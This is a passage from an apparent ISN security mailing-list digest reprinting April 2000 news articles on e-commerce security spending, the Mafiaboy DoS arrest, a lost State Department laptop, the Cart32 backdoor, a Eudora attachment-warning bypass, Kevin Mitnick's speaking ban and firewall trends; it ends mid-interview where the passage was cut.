      BLOOMBERG NEWS
      
      WASHINGTON - Companies including Microsoft Corp., J.C. Penney Co. and
      IBM Corp. are spending more money to guard against computer hackers,
      executives said yesterday at a White House conference aimed at finding
      ways to beef up the security of e-commerce.
      
      Concerns about security breaches have prompted companies to boost
      technology spending to 3, 4 or 5 percent of their operating budgets,
      up from about 1 percent, said Richard Clarke, President Clinton's
      coordinator for infrastructure protection.
      
      "Well-managed companies will have to make the adequacy of their
      information-technology systems an absolute central priority in terms
      of the management of business risk," Treasury Secretary Lawrence
      Summers said at the conference.
      
      The government needs to work with companies to develop the best ways
      to protect information technology, an industry that generates $800
      billion a year for the U.S. economy, White House chief of staff John
      Podesta said at the first of six conferences on computer security.
      
      Company and government officials focused yesterday on how to stop the
      spread of computer viruses and avert the kind of attacks that earlier
      this year temporarily disabled the Web sites of Yahoo Inc., Amazon.com
      Inc. and ETrade Group Inc.
      
      Other incidents included the theft and online posting of customer
      credit-card numbers from online retailer CD Universe.
      
      The attacks on Yahoo and other companies will end up costing more than
      $1.2 billion in losses, missed revenue and expenses for security
      upgrades, Yankee Group Inc., a Boston market-research company,
      estimated.
      
      Companies' efforts to protect themselves could mean work for
      consultants such as Arthur Andersen L.L.P. and security software
      makers such as Check Point Software Technologies Ltd. and VeriSign
      Inc.
      
      Microsoft employs 50 full-time people focused on information security,
      up from seven employees two years ago, Howard Schmidt, chief
      information security officer, said.
      
      On top of antivirus software and firewalls, IBM has devoted resources
      to testing its systems for flaws, said J. Bruce Harreld, IBM's senior
      vice president for strategy.
      
      J.C. Penney has hired consultants and stepped up spending on software
      to guard against attacks that could disrupt business, reveal
      confidential information or hurt the company's reputation, chief
      information officer David Evans said. The company expects $300 million
      in revenue from Internet-related business this year, up from $100
      million the previous year, Evans said.
      
      Financial-services companies have decided to establish a center to
      share information about Internet-related threats and problems, and the
      Treasury Department supports this effort, Summers said.
      
      A broader network of companies from manufacturing, technology and
      other sectors gathered in New York City in December and February to
      brainstorm about security measures, Microsoft's Schmidt said.
      
      Clinton is already asking Congress to provide more money to combat
      computer sabotage. He is seeking $138 million in fiscal 2001, which
      begins Oct. 1, for Justice Department efforts to crack down on
      computer crimes. That is a 28 percent increase from this year.
      
      The President has also proposed doubling the U.S. research and
      development budget for information technology to $2 billion from $1
      billion in the current fiscal year, Clarke said.
      
      The administration doesn't plan to impose new security rules on
      private companies, but will try to facilitate information-sharing,
      research and education about the issue, officials said.
      
      Yet companies shouldn't worry so much about security that they lose
      out on opportunities available on the Internet, said Jacqueline K.
      Wagner, general auditor at General Motors Corp.
      
      "There is an acceptable level of risk that each corporation must
      accept in order to compete in the marketplace," Wagner said.

289.0 [ISN] Price Waterhouse Coopers tackles web security
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1008-200-1722572.html?tag=st.ne.1002.bgif.1008-200-1722572
      
      By Melanie Austria Farmer
      Staff Writer, CNET News.com
      April 20, 2000, 10:35 a.m. PT
      
      Management consulting firm PricewaterhouseCoopers is jumping into the
      Web security market.
      
      The "Big Five" consulting firm will launch a new subsidiary next week,
      called BeTrusted, to provide Web security software to corporate
      clients, said a spokesman for the firm. The company said its
      subsidiary will target companies that make large, complicated
      transactions with their business partners over the Internet.
      
      PricewaterhouseCoopers is jumping into the Web security market as
      companies increase their focus on Net security issues. To date, the
      market has been dominated by VeriSign, which makes software to secure
      online transactions using Public Key Infrastructure (PKI) technology.
      PKI systems issue and manage digital certificates, which serve as
      electronic IDs online.
      
      In recent months, VeriSign has faced heightened competition from a
      growing number of players, including Entrust Technologies and GTE's
      CyberTrust, as more companies conduct increasingly complicated
      transactions via the Web.
      
      PricewaterhouseCoopers and rivals Andersen Consulting, KPMG and EDS
      have all tackled the Web security market to some degree, using their
      services to help financial companies secure their clients'
      transactions online.
      
      PricewaterhouseCoopers, which has been planning the new subsidiary for
      the past year, is targeting clients that conduct hefty transactions
      over the Web that require top-notch security efforts. This includes
      financial institutions that conduct large wire transactions over the
      Internet and companies that engage in large trading transactions with
      their buyers and suppliers.
      
      The new subsidiary, heavily backed by its parent, will initially be
      staffed with about 120 PricewaterhouseCoopers employees and will
      license Web security software from partners Entrust and Baltimore
      Technologies.
      
      The firm's spokesman said BeTrusted will be based in Columbia, Md.; it
      is searching for a chief executive officer and other senior-level
      executives to round out its management team.

290.0 [ISN] Hackers, cybercops, continue cat-and-mouse game.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      By LAURENT BELSIE, The Christian Science Monitor
      
      ST. LOUIS (April 21, 2000 12:09 a.m. EDT http://www.nandotimes.com) -
      Computer hackers cruising the Internet these days should check their
      rear-view mirrors. Those flashing lights might not be the modem. They
      could be the technology police.
      
      With increased personnel, better know-how and higher-profile cases,
      law-enforcement agencies from the United States to Europe are joining
      forces to crack down on Internet crime. If savvy teenagers once could
      drive rings around technologically flat-footed cops, the police are
      catching up.
      
      And they have a message for today's teens: Internet hacking is no
      longer a prank; it's a serious crime.
      
      The arrest this week of a 15-year-old in Montreal in connection with
      the wide-ranging attack on Internet sites such as Yahoo! and eBay
      earlier this year is only the latest sign of the tougher stance.
      
      While the young hacker made a number of simple blunders that led
      cybercops to him, the arrest comes at a key time. Just as police are
      trying to get the word out to teens, older activists are starting to
      copy their methods in order to launch their own politically motivated
      Web attacks.
      
      If the trend catches on, the new cybercops may be called on to break
      up electronic civil disobedience actions much as their predecessors
      broke up antiwar protests in the Vietnam era.
      
      "There are many motivations" for hacking, says Peter Hussey, executive
      vice president of Baltimore Technologies, an electronic-security
      company with its U.S. headquarters in Needham, Mass. While many teens
      do it strictly for the technological challenge, others "actually want
      to cause financial harm to the targets."
      
      Little is known so far about the motivations for "Mafiaboy," the
      hacker arrested this week. He's the first person charged in connection
      with February's attacks. Canadian police have only charged him with
      hacking CNN's Web site. Finding other perpetrators who covered their
      tracks better will be hard.
      
      For many teens, hacking represents the lure of a high-tech joy ride.
      Many defend their actions, saying they're simply exploring. By finding
      gaps in company security systems, hackers can teach companies a lot,
      they add.
      
      "They like to believe that the work that they are doing is performing
      a service and allowing business to fix (problems)," says Jim Finn, a
      former hacker and now top executive at Unisys's information-security
      consulting group in Burlington, Mass.
      
      Hackers make a distinction between their exploration and the willful
      destruction of "crackers." But with millions of dollars of e-commerce
      sales at stake, Internet companies take an increasingly dim view of
      both practices. So do government officials.
      
      "It is important, first of all, that we ... let young people know that
      they are not going to be able to get away with something like this
      scot-free," Attorney General Janet Reno said Wednesday. "There's got
      to be a penalty."
      
      Under Canadian law, juvenile Internet offenders could get as many as
      two years of detention. In the United States, laws vary by state. In
      New Hampshire, for example, the 17-year-old hacker "Coolio" could face
      up to 15 years in prison and a $4,000 fine. He has been charged with
      vandalizing an anti-drug Web site.
      
      Despite a continuing shortage of network-savvy agents, the Justice
      Department is beefing up its Internet-crime expertise. Its
      computer-crime and intellectual-property section now boasts 18
      prosecutors, more than three times the number it had in 1996. The
      department is spending some $100 million on fighting computer crime
      this year and wants to increase that total by one-third next fiscal
      year.
      
      Federal agents aren't only getting better at tracking Internet crime,
      but joining forces with law-enforcement agencies around the world.
      This week's Montreal arrest involved the FBI and the Royal Canadian
      Mounted Police. Last month, the FBI and the Mounted Police teamed with
      British police to arrest two teens charged with operating an
      international credit-card scam.
      
      While the warning about hacking may be getting out to teens, adults
      are quickly picking up their methods. These activists - or
      "hactivists" - are targeting Web sites with which they disagree. Last
      fall, for example, one group hijacked China's Web site, which touted
      its human rights, and replaced it with another, proclaiming the
      Chinese had no rights.
      
      Since then, some activists have become more aggressive, using the same
      tactics - which deny Web surfers access to the site - that hackers
      used in February. That same month, the Federation of Random Action
      launched a denial-of-service attack against Occidental Petroleum to
      protest plans to search for oil in the ancestral land of a Colombian
      tribe.
      
      The Web site of another group, the Electrohippies, explains the
      possibilities of e-disobedience: "What we're out to do is ... (extend)
      the philosophy of activism and direct action into the 'virtual' world
      of electronic information exchange and communications."

291.0 [ISN] Navy intranet a security threat?
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.wired.com/news/politics/0,1283,35713,00.html
      
      by Craig Bicknell
      3:00 a.m. Apr. 21, 2000 PDT
      
      The U.S. Navy's plan to build the world's biggest Intranet could
      create a big security threat and a boondoggle to boot, according to
      the country's largest federal employees union.
      
      "We're concerned about national security, because the Navy's not able
      to answer basic questions about how they will protect national
      security on (the new Intranet), and we're concerned that they're
      playing a shell game with money," said Brendan Danaher, policy analyst
      for the 600,000 member-plus American Federation of Government
      Employees (AFGE).
      
      The union's barrage is the latest attack on the Navy's proposal to
      build a gargantuan, 360,000-seat Intranet that would unify all of the
      Navy and Marine Corp's shore-based operations. The Navy plans to award
      the $10 billion contract for the project to one of four corporate
      bidders this June -- nine months earlier than originally planned --
      reflecting the sea-service's urgency to reap the benefits of modern
      info-tech.
      
      Last month, the United States General Accounting Office testified
      before Congress that the Navy had rushed the proposal to corporate
      bidders without properly analyzing how it would be funded and managed,
      and what effect it would have on military and civilian information
      technology workers.
      
      Since then, embattled Navy representatives have appeared before
      Congress 53 times to defend their plan.
      
      "There's been absolutely no one who questions the need, value, or
      concept of this Intranet," Navy deputy CIO Ron Turner said. "They just
      don't understand the math we've put into this."
      
      But there's more than a math problem, insists AFGE's Danaher. The
      Navy's plan to contract out the installation, service, and oversight
      of the Intranet to a single private company poses an unacceptable
      national security risk, he said.
      
      "We're concerned that private companies will put their interest before
      national security," Danaher said. "What if that company's ownership
      changes, or its stock price plummets. Who knows what could happen?"
      
      That argument lacks a certain sophistication, according to Turner.
      
      "It's a comment made without looking at how we currently operate. The
      government would like you to believe that we control the networks, but
      we ride on commercial fiber that someone else operates," he said.
      
      Moreover, the Navy currently operates 100-plus separate networks, all
      with different firewalls and security, all of which have to
      interconnect. That means 100 points of vulnerability, according to
      Turner. With a unified Intranet, the Navy can deploy one security
      system and screw it down tight. Security will be improved, not
      degraded, he insists.  There's no budget problem either, Turner said.
      Funds for the Intranet will come from money already allocated for IT
      projects, not from the operational coffers that pay for ships to sail
      and planes to fly, as critics in Congress have charged.
      
      Turner attributes the AFGE's attack largely to a self-serving desire
      to protect union IT jobs that might be threatened by the new Intranet.
      Some 1,000 civilian IT employees could be displaced by the Intranet,
      he said, but the Navy will take pains to place them in new positions.
      
      Danaher counters that it's not the threat of job losses that concerns
      the AFGE so much as the Navy's inability to say exactly what jobs
      might be lost where, and what that says about the broader project. "We
      don't know, the Navy doesn't know, nobody knows, and that's a symptom
      of a larger problem," Danaher said.
      
      "Our members are people that work for the military and the federal
      government, and they're concerned about national security and
      efficiency," he said. "When you look at the history, you see that the
      Navy is anything but trustworthy when it comes to contract oversight.
      We're not saying this is a horrible idea, but the way they're going
      about this is pretty dangerous."
      
      The government's accounting office and a number of congressmen share
      those concerns.
      
      "Look, we're not trying to pull the wool over people's eyes," said a
      weary Turner, who expects to appear before Congress several times in
      the coming weeks to further detail the Navy's proposal.
      
      Meanwhile, barring any direct orders to the contrary, the project will
      continue full-speed ahead.
      
      "Nobody's told us to stop or slow down," Turner said.

292.0 [ISN] Missing PC held trove of secrets..
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.washingtonpost.com/wp-dyn/articles/A59527-2000Apr21.html
      
      By Steven Mufson
      Washington Post Staff Writer
      Saturday , April 22, 2000 ; A01
      
      The laptop computer missing from the State Department contained
      thousands of classified documents about arms proliferation issues,
      including highly sensitive information about the sources and methods
      of U.S. intelligence collection, State Department officials said
      yesterday.
      
      The State Department still has not found the computer, which vanished
      in January from a conference room, according to a senior State
      Department official. Its disappearance was reported to the
      department's Bureau of Diplomatic Security in early February,
      according to another official.
      
      If the laptop was stolen for the information it contained about the
      spread of sophisticated weapons technology, the theft would represent
      one of the most serious single losses of classified information ever
      by the United States, said a source familiar with the case.
      
      Several sources in the department said that Secretary of State
      Madeleine K. Albright is "furious" about the security lapse and is
      once again considering the transfer of responsibility for top-secret
      information from the Bureau of Intelligence and Research (INR) to the
      Bureau of Diplomatic Security.
      
      Within the State Department, INR handles all government intelligence
      reports classified as "sensitive compartmented information," while
      diplomatic security handles less sensitive documents with lower levels
      of classification. The laptop contained "code word" information, a
      classification higher than top secret.
      
      Many State Department security officers, members of Congress and other
      government intelligence officials have been asking why sensitive
      information about the spread of missile technology and nuclear,
      chemical and biological weapons was stored in a portable laptop
      instead of a fixed desktop computer.
      
      After The Washington Post first reported that the laptop was missing,
      the chairman of the House International Relations Committee, Rep.
      Benjamin A. Gilman (R-N.Y.), said he would hold hearings on
      allegations of lax security at the State Department.
      
      A senior State Department official said yesterday the laptop was never
      supposed to leave the INR conference room in which it was kept. The
      senior official said a laptop was used instead of a desktop computer
      so that different people with clearance could use the computer and
      access its information without having to switch chairs.
      
      State Department officials said they still hope to recover the laptop
      if it was stolen simply for the value of the computer hardware rather
      than the information it stored. The FBI has joined the search and the
      examination of suspects, including contractors who have been
      renovating the area, the official said.
      
      A person familiar with the laptop incident said an official had
      propped open the door of the secure conference room, that contractors
      lacking security clearances were working in the sensitive area, that
      the contractors were not properly escorted, and that the laptop had
      not been properly secured.
      
      The laptop incident is the latest of a string of embarrassing security
      breaches at the State Department. Last year, counterintelligence
      officials from the FBI discovered a Russian spy lurking outside the
      department and, later, an eavesdropping device carefully planted in
      the wall molding of a conference room inside.
      
      In 1998, a man dressed in a tweed coat strolled into an executive
      secretary's office, six doors down from the office of Secretary of
      State Albright, helped himself to a sheaf of classified briefing
      materials in plain view of two secretaries, and walked out. The man
      was never identified and the materials never recovered.

292.0 [ISN] Hackers break into Romanian senate's web site.

      BUCHAREST, Romania (April 24, 2000 11:08 a.m. EDT
      http://www.nandotimes.com) - Hackers broke into the Senate Web site
      and replaced it with text alleging that all lawmakers are corrupt and
      working for their own financial well-being, a newspaper reported
      Monday.
      
      The modified Web page, described in detail in Monday's daily Adevarul,
      said of the lawmakers: "You are guided by the words 'hefty allowances
      and bribes.'"
      
      "Shamelessly stealing as much as they could, both from domestic and
      foreign funds, those taking office after 1996 succeeded in
      exponentially raising their standards of living, with mansions and
      cars worth tens of thousands of dollars," the modified version said.
      
      The word "corrupted," written in English, was superimposed over the
      text, according to Adevarul.
      
      The page, which was changed Saturday, could not be accessed Monday
      morning.
      
      One hacker at a Romanian chat site claimed credit for the attack, but
      another scoffed at his claims.
      
      Polls conducted over the years consistently show Romanians have little
      trust in parliament. Lawmakers' recently voted to double their own
      salaries.
      
      This is the second time in recent months that hackers have attacked a
      government Web site. Hackers broke into the Finance Ministry's site in
      November, introducing bogus "taxes on stupidity" and changing the
      exchange rate of Romania's national currency.

293.0 [ISN] FBI investigating new web attack

      Top-five Internet service provider AboveNet Communications suffered a
      denial-of-service attack on Tuesday -- raising the specter of another
      round of Web attacks.
      
      Paul Vixie, senior vice president of Internet services for Metromedia
      Fiber Network Inc., AboveNet's parent company, said the attack did not
      resemble February's spate of DoS attacks.
      
      "This was not just a SMURF attack or some other broadcast storm aiming
      meaningless data at our routers," Vixie said. "It was a direct attack
      on our infrastructure."
      
      The attack stopped Internet traffic to AboveNet's customers for
      several hours starting late Tuesday morning.
      
      The White Plains, N.Y., company is working with the FBI to investigate
      the attack and declined to give more-specific details. Vixie did say
      that tracking the attacker should not be as difficult as February's
      DoS attacks had been. "Technically, there is cause for hope, where in
      the (denial of service) case their was no cause for hope," he said.
      
      Last week, a 15-year-old Canadian boy who called himself "Mafiaboy"
      online was arrested by the Royal Canadian Mounted Police and charged
      in connection with the denial-of-service attack on CNN's online site
      in February.
      
      The teen, whose name was not released due to his age, was arrested
      April 15 and formally charged two days later with two counts of
      mischief to data after police searched his home. No suspects have been
      named in the attacks on at least seven other sites, however.
      
      AboveNet attack more skilled This attacker seemed a bit more skilled
      than the cybervandals who flooded eight major Web sites in February,
      Vixie said. "I would bet that this was someone with a little more
      experience than the last batch."
      
      AboveNet provides Internet service of and hosts the Web sites of
      nearly 1,000 companies, with offices in the United Kingdom, Germany,
      the Netherlands and Japan.
      
      Vixie said Tuesday's attack could not succeed again. "We plugged the
      hole that has allowed it to happen," he said.

294.0 [ISN] Backdoor exposes credit cards
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      8:00 a.m. Apr. 27, 2000 PDT
      
      (Editor's note: This story has been modified since its initial
      posting. The original publication of this story included the password
      in question.)
      
      Thousands of credit card numbers stored on e-commerce websites are
      available to anyone with a backdoor password, a British consulting
      firm has discovered.
      
      Cerberus Information Security said on Thursday it found a secret
      password that allows someone connecting to a website running "Cart32"
      shopping cart software to gain access to the server.
      
      McMurtrey-Whitaker, the Springfield, Missouri firm that sells Cart32,
      confirmed the backdoor -- which can reveal such data as credit card
      numbers, order information, and shipping addresses -- and said they
      would distribute a repaired version of the program next week.
      
      Hundreds of small-to-medium websites, including Jazzworld.com,
      MusicWorld CD, ComputerShop.com, Wirelesstoys.com, and
      ChocolateVault.com, use Cart32 shopping software, which runs on
      Windows 95 and Windows NT machines.
      
      "We've been notified of it," said Matt Humes, a technical support
      representative at McMurtrey-Whitaker.
      
      Right now, Cart32 administrators can edit the executable file and
      manually delete the password to close the security hole. "By Monday
      [or] Tuesday, there's going to be a much easier fix to make everything
      completely secure," Humes said.
      
      Larger firms like Amazon and CDNow tend to use custom shopping cart
      software. Smaller ones turn to programs like Cart32, or competitors
      like WebGenie Software's shopping cart, Open Market's ShopSite, or
      Mercantec's SoftCart.
      
      The Cart32 password could have been inserted by a malicious
      McMurtrey-Whitaker employee who hoped to steal credit card numbers, or
      the firm could intentionally have enabled it so their technical
      support staff could fix customers' problems from afar.
      
      McMurtrey-Whitaker said that the vulnerability was included in earlier
      versions of Cart32, which means that anyone who knew the password
      could have had access to sites' personal information for at least a
      year.
      
      Cerberus' David Litchfield said he stumbled across Cart32 after seeing
      a banner ad for the product, and decided to explore its potential
      vulnerabilities on Wednesday evening.
      
      "My brother and I spent about two hours looking at it (before we
      discovered the backdoor)," Litchfield said. "I'm extremely surprised
      that it's in there."
      
      Litchfield said his eight-person security consulting firm has released
      eight security advisories this year, and they decided to publish the
      password because of the magnitude of the problem.
      
      To gain access to customer files, an attacker could use the password
      to alter the shopping cart to leak information when users connect to
      the site. Cerberus said it also discovered a way to change Cart32's
      administrative password without knowing what the original one was.
      
      Litchfield also found some odd information about the program's
      designers embedded in the 700KB cart32.exe file. One example: "My Name
      / Bryan L. Whitaker / My Wifes Name / Melissa K.Whitaker and Kaylee
      (our baby)."
      
      One expert criticized the company's planned bug fix as unduly tardy.
      
      "If they're waiting until Tuesday or Wednesday to fix this problem,
      that's definitely a bad idea. It doesn't take a genius to figure out
      what's going to happen all weekend," said Steve Manzuik, the moderator
      of Win2K Security Advice, referring to malicious hacker attacks.

295.0 [ISN] Qualcomm warns of Eudora security hole
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1005-200-1773077.html?tag=st.ne.fd.lthd.1005-200-1773077
      
      By Paul Festa
      Staff Writer, CNET News.com
      April 27, 2000, 3:10 p.m. PT
      
      Qualcomm is urging people who use Eudora to guard against a
      potentially dangerous security vulnerability.
      
      Normally, before Eudora and similar email applications will run an
      executable file attached to an email message, they will present a
      warning that asks whether the recipient wants to risk running
      untrusted code on the computer. But in an exploit devised by bug
      hunter and anticontent-filtering advocate Bennett Haselton, a hostile
      email sender can circumvent that warning.
      
      "This is a potential way to get around Eudora's ability to warn people
      that something dangerous could happen," said Jeff Beckley, technical
      lead for Windows Eudora at Qualcomm.
      
      Haselton's exploit works by attaching an executable (".exe") file and
      linking to that file from the body of the message through another
      attached file, this one of the Windows shortcut file type (".lnk").
      
      If someone were to click directly on an ".exe" file, Eudora would
      flash a warning. But routed through the ".lnk" file, the executable
      gets a free pass.
      
      Moreover, Haselton's demonstration works by disguising the ".lnk"
      extension, making the ruse effective against more savvy individuals.
      
      Beckley said Qualcomm would add ".lnk" to its list of file extensions
      that earn warnings in the next iteration of Eudora for the Windows
      operating system, version 4.3.2. Beckley described that version as
      "weeks away."
      
      In the meantime, people can take matters into their own hands by
      changing security clearance settings themselves. Those with Windows
      Eudora 4.2 and higher can copy this link into a Eudora composition
      message and click on the "OK" button that follows:
      x-Eudora-option:WarnLaunchExtensions=exe|com|bat|cmd|pif|htm|do|xl|reg|lnk|.
      
      Others who use Eudora should find the "Eudora.ini" file in their
      Eudora program file and add
      "WarnLaunchExtensions=exe|com|bat|cmd|pif|htm|do|xl|reg|lnk|" after
      the line that has the text "Settings."

296.0 [ISN] Infamous computer hacker under fire..
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.lasvegassun.com/sunbin/stories/tech/2000/apr/28/042800288.html
      
      LOS ANGELES (AP) -- Kevin Mitnick, the notorious computer hacker
      accused of causing millions of dollars in damage to technology
      companies, has been ordered to get off the lecture circuit or risk
      going back to prison.
      
      The federal probation department sent word through his probation
      officer that his activities must stop, Mitnick said Thursday.
      
      "They're saying I can no longer write or speak about technology
      issues." Mitnick said in a telephone interview. "I think it is an
      abrogation of my First Amendment rights. ... Probation is not supposed
      to be punitive."
      
      Government officials could not be reached for comment after business
      hours Thursday.
      
      Mitnick, who was released in January after nearly five years in
      federal prison, allegedly cost companies and institutions millions of
      dollars by stealing their software and altering computer information.
      Victims included such companies as Motorola, Novell, Nokia and Sun
      Microsystems, and the University of Southern California.
      
      He became an icon to some hackers after leading the FBI on a
      three-year manhunt that ended in 1995 when investigators traced his
      electronic footprints to a Raleigh, N.C., apartment.
      
      Under a plea agreement, U.S. District Judge Mariana Pfaelzer
      prohibited Mitnick for three years after his release from any access
      to computers, cellular telephones, televisions or any equipment that
      can be used for Internet access. She said that she thought Mitnick
      would be unable to earn anything above minimum wage.
      
      However, a recent Internet report said Mitnick had some $20,000 worth
      of speaking engagements scheduled through August.
      
      "They don't like the idea of my being like a celebrity," Mitnick said.
      "They are trying to chill my free speech in hopes that my notoriety
      will die down."
      
      Mitnick, 36, said he has been trying to educate others about
      protecting themselves against cyberspace intrusions.
      
      "This is good for the public and good for me because I feel
      productive," Mitnick said. "I recognize the errors of my past and I
      want to be productive."
      
      Mitnick, who served nearly five years in prison, said probation
      officials have instructed him to find employment in a field totally
      unrelated to computers. He has refused.
      
      "I'm not going to spend time and money educating myself in a new field
      when in two years I'll be off probation and can go back to computers,"
      he said.

297.0 [ISN] Palm VII banned from lab as security threat.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://www.sjmercury.com/svtech/news/breaking/merc/docs/001887.htm
      
      BY BRIAN ANDERSON
      Valley Times
      
      LIVERMORE -- Lawrence Livermore National Laboratory officials have
      identified a new security threat -- the Palm VII personal organizer.
      
      While the Palm VII gives gadget junkies the power to check e-mail and
      download stock quotes on the fly, security officers say it also makes
      it easier for would-be spies to copy and ship guarded information.
      None of the country's most sensitive material has been compromised,
      but the lab is not taking chances.
      
      ``It's feasible to load a classified document or program into that,
      point it out a window and transmit it to a receiver off-site or
      outside of the classified area,'' said lab spokesman David Schwoegler.
      ``That's the reason these things have been prohibited.''
      
      Under the Department of Energy's Technical Surveillance
      Countermeasures directives, electronic devices that can transmit
      information over radio waves are prohibited in protected areas. Since
      the Palm VII is so small, lab officials are also banning it in
      unclassified areas so that employees don't carry it into protected
      areas by mistake. The device is about the size of a woman's wallet.
      
      Energy department officials did not return a phone call seeking
      comment.
      
      This month, the lab had to return some of about 40 of the outlawed
      organizers that it bought after realizing they violated the policy.
      
      The Palm VII, which costs about $450 retail and can download
      everything from homework applications to weapons schematics, has been
      targeted specifically because it is the only such organizer that can
      transmit using radio frequencies, Schwoegler said.
      
      Greg Rhine, Palm's vice president of sales, said the lab's stance is
      unfortunate and the security concern is based more in the human arena
      than the technology.
      
      ``I presume they probably have the same feeling about wireless
      communications on voice as well,'' Rhine said.
      
      Earlier generations of the Palm Pilot that do not use the radio
      frequency for transmission can still be used by lab employees. The lab
      has not fielded any complaints from employees, officials said.
      
      The policy also prohibits the use of cellular phones and some computer
      watches. Other items prohibited without express permission from
      security officials include cameras, binoculars, electronic address
      books, radios and recording equipment.

      What Firewalls Will Look Like in the Year 2003

      What Firewalls Will Look Like in the Year 2003 
      By Scott C. Sanchez, CISSP ? scott@gungadin.com
      
      Current Firewall technology and operation is quickly becoming
      outdated.  Here, we present guidelines and predictions to keep
      companies alert to the rapidly changing face of security.
      
      Core Topics
      
      Network Security, Infrastructure Security and Security Management
      
      Key Issues
      How will enterprise-level Firewalls look in the year 2003 and who will
      be the dominant vendors?
      
      How should management prepare for the rapid transformation that is
      taking place in the Firewall arena?
      
      Since their inception as simple bridges with access lists, Firewalls
      have become one of the most crucial components in any successful
      Internet initiative.  They can provide for a single "choke point" on a
      network in which traffic can be filtered, monitored and analyzed.  
      Many organizations go further and implement Firewalls to provide user
      and process authentication, traffic shaping and load balancing
      services to their networks.  Some have taken Firewalls to the highest
      level currently possible and integrated virus and content scanning for
      web pages, email and other types of Internet traffic.
      
      Current Firewall Technologies 
      The majority of companies are using a software-based Firewall such as
      Firewall-1 by Checkpoint Software or Gauntlet Firewall by Network
      Associates.  These Firewall packages run on top of a Unix or Windows
      NT server, and provide a very broad range of capabilities.  Network
      Associates has recently integrated their entire suite of products
      (PGP, VirusScan, CyberCop) into Gauntlet's capabilities.  It seems
      that their hope is that by leveraging off of the large customer base
      that already uses these products, they can increase market share on
      the Firewall stage.
      
      The first true Firewall that was not dependent on a commercial OS was
      the PIX from Cisco.  The highly successful PIX Firewall was recently
      (and quite silently) renamed as "CiscoSecure PIX ? The Internet
      Appliance".  While Cisco may have been the first vendor to introduce a
      Firewall that could be classified as an appliance, they certainly were
      not the first to use it in their marketing.
      
      Nokia signed a deal in 1997 with Checkpoint Software that would set
      the stage for what has developed into a very successful product line
      for both companies. Nokia designed and built various "boxes" of
      varying sizes and capabilities running a custom operating system based
      on a stripped-down version of Unix.  The key being that no Unix
      experience was needed to set up or maintain the box. Checkpoint then
      modified their successful Firewall-1 product to run on this new box
      from Nokia.  Hence, the Firewall Appliance concept was born and the
      marketing hype began.
      
      Customer Pressures to Vendors
      Increasingly, the level of satisfaction with Firewall technologies has
      been diminishing. Customers want, need and demand more from the
      capabilities presented to them by Firewall vendors.  Major issues to
      customers are ease of management, cost of ownership and learning
      curves.  Companies either are pressuring vendors to create Firewalls
      that are easy to install and manage, yet highly secure and versatile.  
      Companies require a Firewall solution that can grow and change quickly
      with their organization without significant cost or effort.
      
      End Results and Predictions
      This high level of customer pressure that vendors are feeling about
      Firewall technologies is going to result in a huge success of the
      appliance concept. Vendors such as Nokia/Checkpoint and Cisco that
      already have high market share in the appliance arena are going to
      continue their success.  By 2003, an estimated 80% of all enterprise
      Firewalls in use will be appliance-based.
      
      Some of the major features to look for in Firewalls going 
      forward are:
      
      ·     Highly secure "out of the box"
      
      ·     Low cost of ownership and learning curve
      
      ·     Simplified management screens being used to implement 
            complex corporate and network security policies
      
      ·     Proactive security monitoring, alerting and anomaly 
            detection
      
      ·     High availability and redundancy
      
      In addition, Firewall vendors will be using the appliance model to
      everyone's benefit.  Gone will be the days of buying a solution where
      you get everything in one package.  Firewall and security product
      vendors will work together to create an open standard for
      interoperability among their products.  This trend is already showing
      itself in the capabilities of products such as ISS RealSecure, or
      NetPartners WebSense (see Note 1).  Both products integrate rather
      seamlessly with both Nokia's Checkpoint Firewalls as well as Cisco's
      PIX Firewall Appliances.
      
      This will allow customers to create highly customized solutions to
      their security needs.  Customers will dictate to the vendors what
      features and functionality the Firewall provides, not the other way
      around.  Security solutions will move away from the single "border"
      Firewall and more towards a zoned or layered security model.  This
      method of implementing security is both highly effective and provides
      for the most opportunity for ROI.
      
      Bottom Line
      Firewall technologies will change very drastically by 2003.  Security
      Management and Senior Management alike must be prepared.  Future
      security initiatives must consider a layered approach to Security in
      order to create an environment that will benefit from the new breed of
      Firewalls.

      ISS (Internet Security Systems, Inc.) RealSecure is software that
      provides proactive intrusion and anomaly detection and reporting.
      
      NetPartners, Inc. WebSense allows companies to implement web site
      content filtering for it's employees, to prevent unauthorized and
      inappropriate Internet usage.

299.0 [ISN] Mitnick reacts to speaking ban
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1005-200-1781398.html?tag=st.ne.1002.thed.1005-200-1781398
      
      By Paul Festa
      Staff Writer, CNET News.com
      April 29, 2000, 7:00 a.m. PT
      
      Q&A Convicted hacker Kevin Mitnick is back in the news over the
      Justice Department's unhappiness with his speaking on the lecture
      circuit.
      
      Mitnick, recently released from prison, was told by his probation
      officer earlier this week that such appearances violate the terms of
      his parole. Under his plea agreement, he is prohibited from using
      computers, mobile phones or any other device to access the Internet
      for three years.
      
      News.com caught up with Mitnick as he prepared to challenge the
      decision to bar him from speaking and writing engagements.
      
      CNET News.com: Since your release, where have you been engaged to
      speak and write?
      
      A: I've been a commentator to Fox News, Court TV, CNN and Canada AM.
      I've written for Newsweek and Time, though Newsweek killed the article
      when they found out I was writing for Time the same week. I wrote an
      op-ed piece for the Guardian in the U.K. Brill's Content wanted me to
      write a critique of articles in the computer trade press, but I'm
      being precluded from doing that.
      
      Q: Couldn't there be some concern about your profiting from your
      crimes?
      
      A: I signed an assignment agreement as part of my settlement. It says
      that if were to write a book that I couldn't profit from that for
      seven years. It was a side agreement to settle the case. The money
      would go to the government for anything portraying the story of my
      crime. I don't intend to write a book about my experience because of
      that limitation.
      
      Q: How did the directive on speaking and writing come about?
      A: I got a letter from the department on April 12th. My probation
      officer was very supportive of my doing these engagements, but when he
